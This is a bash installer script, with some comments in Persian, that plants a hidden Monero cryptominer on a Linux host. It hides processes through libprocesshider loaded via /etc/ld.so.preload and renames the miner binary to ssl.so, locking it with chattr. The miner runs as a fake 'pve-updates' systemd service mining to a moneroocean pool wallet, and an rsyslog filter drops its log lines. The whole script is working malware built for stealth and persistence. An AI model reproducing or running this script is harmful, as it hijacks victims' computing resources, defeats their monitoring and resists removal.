#!/bin/bash

# Go to the libprocesshider directory
cd libprocesshider || { echo "Directory 'libprocesshider' does not exist!"; exit 1; }

# Compile the shared library
gcc -Wall -fPIC -shared -std=c99 -o libmodules.so processhider.c -ldl || { echo "Compilation failed!"; exit 1; }

# Move the shared object to /usr/local/lib/
mv libmodules.so /usr/lib/x86_64-linux-gnu/ || { echo "Moving libmodules.so failed!"; exit 1; }

# Add the library path to /etc/ld.so.preload if not already present
if ! grep -Fxq "/usr/lib/x86_64-linux-gnu/libmodules.so" /etc/ld.so.preload 2>/dev/null; then
    echo /usr/lib/x86_64-linux-gnu/libmodules.so | tee -a /etc/ld.so.preload
fi

# Go back to the parent directory
cd ..

# Extract and move the system file
tar -xvzf system.tar.gz || { echo "Extraction failed!"; exit 1; }
mv system ssl.so || { echo "Rename Success"; exit 1; }
mv ssl.so /usr/lib/x86_64-linux-gnu/ || { echo "Moving 'system' failed!"; exit 1; }

chattr +i /usr/lib/x86_64-linux-gnu/ssl.so

# Cleanup
rm -rf libprocesshider
rm -rf system.tar.gz

# مسیر فایل اجرایی و پارامترها
DST_PATH="/usr/lib/x86_64-linux-gnu/ssl.so"
PARAMS="-a rx -o gulf.moneroocean.stream:10128 -u 44jLmyRwJnxF2arcBME6c2SY4UoCXf9XA3m5XpZKu8iuVC5PsmYPV3AUQSDedKW2wacUovxQWSsxzGsM5stHdUMnVi6Z5Lz -p x1"

# مجوز اجرا
chmod +x "$DST_PATH"

# تنظیم context SELinux (در صورت وجود)
if command -v restorecon >/dev/null 2>&1; then
    restorecon -v "$DST_PATH"
fi
if command -v chcon >/dev/null 2>&1; then
    chcon -t bin_t "$DST_PATH"
fi

# ۱ — سرویس بساز
SERVICE_FILE="/usr/lib/systemd/system/pve-updates.service"
bash -c "cat > $SERVICE_FILE" <<EOF
[Unit]
Description=PVE Updates Daemon
After=network.target

[Service]
Type=simple
Environment="HOME=/root"
Environment="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Nice=19
CPUAffinity=0-19
StandardOutput=null
StandardError=null
SyslogIdentifier=kernel-tasks
ExecStart=$DST_PATH $PARAMS
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# ۲ — rsyslog فیلتر
cat > /etc/rsyslog.d/drop-miner.conf <<EOF
if \$programname == 'systemd' and \$msg contains 'kernel-tasks' then stop
EOF

# ۳ — فعال کن
systemctl daemon-reload
systemctl restart rsyslog

chattr +i /usr/lib/systemd/system/pve-updates.service

# فعال‌سازی و راه‌اندازی سرویس
systemctl daemon-reload
systemctl enable pve-updates.service
systemctl restart pve-updates.service

# نمایش وضعیت سرویس
systemctl status pve-updates.service

